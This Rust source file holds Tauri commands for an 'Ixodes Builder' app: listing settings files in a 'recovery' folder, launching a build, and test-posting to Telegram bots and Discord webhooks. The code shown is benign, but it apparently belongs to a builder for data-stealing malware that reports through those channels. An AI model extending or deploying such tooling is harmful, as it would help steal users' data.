use crate::builder;
use crate::error::IxodesError;
use crate::models::{BuildRequest, BuildResult, SettingsFile};
use std::fs;
use tauri::AppHandle;

#[tauri::command]
pub fn list_settings_files() -> std::result::Result<Vec<SettingsFile>, IxodesError> {
    let ixodes_root = builder::ixodes_root()?;
    let recovery_dir = builder::recovery_dir(&ixodes_root);
    let default_settings = builder::defaults_path(&ixodes_root);

    let entries = fs::read_dir(&recovery_dir)?;

    let mut files: Vec<SettingsFile> = entries
        .filter_map(|entry| entry.ok())
        .filter_map(|entry| {
            let path = entry.path();
            if !path.is_file() {
                return None;
            }
            let file_name = path.file_name()?.to_string_lossy().to_string();
            if !file_name.ends_with(".rs")
                || (!file_name.contains("settings") && file_name != "defaults.rs")
            {
                return None;
            }
            let is_default = path == default_settings;
            Some(SettingsFile {
                name: file_name,
                path: path.to_string_lossy().to_string(),
                is_default,
            })
        })
        .collect();

    files.sort_by(|a, b| a.name.cmp(&b.name));
    if files.is_empty() {
        return Err(IxodesError::Config("no settings files found in ixodes/src/recovery".into()));
    }

    Ok(files)
}

#[tauri::command]
pub async fn build_ixodes(app: AppHandle, request: BuildRequest) -> std::result::Result<BuildResult, IxodesError> {
    tauri::async_runtime::spawn_blocking(move || builder::build_ixodes_sync(app, request))
        .await
        .map_err(|err| IxodesError::Build(format!("build task failed to join: {err}")))?
}

#[tauri::command]
pub async fn test_telegram_connection(token: String, chat_id: String) -> std::result::Result<String, IxodesError> {
    tauri::async_runtime::spawn_blocking(move || {
        let url = format!("https://api.telegram.org/bot{}/sendMessage", token);
        let client = reqwest::blocking::Client::new();
        let payload = serde_json::json!({
            "chat_id": chat_id,
            "text": "🔔 Ixodes Builder: Connection Test Successful!"
        });

        let response = client
            .post(&url)
            .json(&payload)
            .send()?;

        if response.status().is_success() {
            Ok("Connection successful".to_string())
        } else {
            Err(IxodesError::General(format!("Telegram API error: {}", response.status())))
        }
    })
    .await
    .map_err(|e| IxodesError::General(format!("Task failed: {}", e)))?
}

#[tauri::command]
pub async fn test_discord_connection(webhook: String) -> std::result::Result<String, IxodesError> {
    tauri::async_runtime::spawn_blocking(move || {
        let client = reqwest::blocking::Client::new();
        let payload = serde_json::json!({
            "content": "🔔 Ixodes Builder: Connection Test Successful!"
        });

        let response = client
            .post(&webhook)
            .json(&payload)
            .send()?;

        if response.status().is_success() {
            Ok("Connection successful".to_string())
        } else {
            Err(IxodesError::General(format!("Discord API error: {}", response.status())))
        }
    })
    .await
    .map_err(|e| IxodesError::General(format!("Task failed: {}", e)))?
}
